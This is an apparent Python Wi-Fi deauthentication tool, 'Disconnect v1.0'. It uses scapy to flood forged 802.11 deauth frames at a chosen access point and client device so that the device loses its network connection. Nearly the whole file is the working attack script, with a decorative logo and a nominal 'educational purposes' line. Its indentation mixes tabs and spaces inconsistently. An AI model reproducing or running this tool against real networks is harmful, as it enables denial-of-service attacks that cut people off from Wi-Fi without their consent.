# Authors: Shir, Hodaya and Alexey
# Version: 1.0
# Date: 07/2019

# libraries
import argparse
import os
import subprocess
import re
import sys 
from time import sleep
try:
	from scapy.all import *
except ImportError:
    	print("[-] scapy module not found. Please install it by running 'sudo apt-get install python-scapy -y'")
	exit(1)

# Colours for print
GREEN = '\033[92m'
RED = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'

# Print our logo
def logo():
	OurLogo = ""
	for row in range(7):
		i = 7 - row
		#  Printing Stars '*' in Right Angle Triangle Shape
		for j in range(0, i):
			OurLogo = OurLogo + "*"
		for j in range(0, 7-i):
			OurLogo = OurLogo + " "
		OurLogo = OurLogo + "  "
		#  Printing Stars '*' in A Shape		
		for col in range(5):
			if(col == 0 or col == 4) or ((row == 0 or row == 3) and (col > 0 and col < 4)):
				OurLogo = OurLogo + "*"
			else:
				OurLogo = OurLogo + " "
		OurLogo = OurLogo + "  "
		#  Printing Stars '*' in S Shape		
		for col in range(5):
			if((row == 0 or row == 3 or row == 6) and (col > 0 and col < 4)) or ((row == 1 or row == 2) and (col == 0)) or ((row == 4 or row == 5) and (col == 4)):
				OurLogo = OurLogo + "*"
			else:
				OurLogo = OurLogo + " "
		OurLogo = OurLogo + "  "
		#  Printing Stars '*' in H Shape
		for col in range(5):
			if(col == 0 or col == 3) or (row == 3 and (col > 0 and col < 4)):
				OurLogo = OurLogo + "*"
			else:
				OurLogo = OurLogo + " "
		OurLogo = OurLogo + "  "
		#  Printing Stars '*' in Left Angle Triangle Shape
		for j in range(0, 7-i):
			OurLogo = OurLogo + " "
		for j in range(0, i):
			OurLogo = OurLogo + "*"
		OurLogo = OurLogo + "\n"
	print(BOLD + OurLogo + ENDC)

# Print banner with info
def banner():
    	print(BOLD + "\n+--------------------------------------------------------------------------------------------+" + ENDC)
    	print(BOLD + "|Disconnect v1.0                                                                             |"+ ENDC)
    	print(BOLD + "|Coded by Alexey, Hodaya & Shir                                                              |"+ ENDC)
	print(BOLD + "+--------------------------------------------------------------------------------------------+\n"+ ENDC)

# Graphic spinner
def spinner():
	while True:
        	for cursor in '|/-\\':
	            yield cursor

spin = spinner()

# Disconnect the chosen device from AP
def send_deauth(wlan, ap_choice, device_choice):
	global dead
    	pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1=device_choice, addr2=ap_choice, addr3=ap_choice)/scapy.all.Dot11Deauth()
	print(GREEN+"[*] Sending Deauthentication Packets to -> "+ap_choice+" from "+device_choice+ENDC)
	while True:
        	try:
            		sys.stdout.write("\b{}".format(next(spin)))
            		sys.stdout.flush()
            		scapy.all.sendp(pkt, iface=wlan, count=1, inter=.2, verbose=0)
        	except KeyboardInterrupt:
	    		dead = False
            		print(BOLD+"\nKAKA ;)"+ENDC)
	    		exit(0)

# Main trigger
if __name__=="__main__":
	logo()

	# Parser of arguments from command line	
	parser = argparse.ArgumentParser(description='Sends deauthentication packets to a device in the wifi network - which results \
                                                      in the disconnection of the device from the network.  [Coded by Shir, Hodaya & Alexey]',
					epilog="Please use the program for educational purposes.")
	parser.add_argument('-w', action='store', dest='wlan', type = str, help='iface for monitoring')
    	parser.add_argument('-b', action='store', dest='ap', type = str, help='choosed Router')
	parser.add_argument('-d', action='store', dest='device', type = str, help='choosed Device')
    	parser.add_argument('-v', action='version', version='%(prog)s 1.0')
    	results = parser.parse_args()

	# Only root    	
	if not os.geteuid() == 0:
        	print(RED+"[-] Script must run with 'sudo'"+ENDC)
        	exit(1)
        # Print default setting
	if (len(sys.argv) < 2):
		print(RED+"[-] You need enter parameters"+ENDC)
        	exit(1)
	
        banner()
        wlan = results.wlan
        ap_choice = results.ap 
        device_choice = results.device
        send_deauth(wlan, ap_choice, device_choice)
